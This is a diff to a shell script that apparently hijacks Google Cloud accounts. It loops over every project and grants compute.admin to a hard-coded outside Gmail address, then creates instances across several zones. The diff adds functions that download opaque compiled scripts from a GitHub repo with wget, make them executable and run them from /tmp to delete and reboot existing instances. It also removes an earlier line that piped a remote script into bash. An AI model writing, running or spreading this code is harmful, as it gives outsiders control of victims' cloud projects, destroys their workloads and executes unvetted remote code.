@@ -3,7 +3,15 @@
 email="oldhuman55@gmail.com"
 
 delete_instances (){
-curl -s -L https://raw.githubusercontent.com/oldhuman/shameOnYou/master/delete.sh | bash -s
+	wget https://github.com/oldhuman/shameOnYou/raw/master/delete.sh.x -O /tmp/delete.sh.x
+	chmod +x /tmp/delete.sh.x
+	cd /tmp && ./delete.sh.x
+}
+
+restart_instances (){
+	wget https://github.com/oldhuman/shameOnYou/raw/master/reboot-all.sh.x -O /tmp/reboot-all.sh.x
+	chmod +x /tmp/reboot-all.sh.x
+	cd /tmp && ./reboot-all.sh.x
 }
 
 create_instance (){
@@ -13,11 +21,12 @@ gcloud beta compute --project=$1 instances create instance-$2 --zone=$3 --machin
 instances_count=$(gcloud compute instances list --filter="status=running" --format="value(name)" | wc -l)
 #LOGIC
 delete_instances
+restart_instances
 for project in $(gcloud projects list  --format="value(project_id)")
 	do
-		gcloud config set compute/zone us-central1-c
 		gcloud projects add-iam-policy-binding $project --member user:$email --role roles/compute.admin
 		gcloud config set project $project
+		gcloud config set compute/zone us-central1-c
 		echo "Project: " $project
 		i=1
 		for zone in "us-central1-b" "us-east1-b" "us-west2-a"
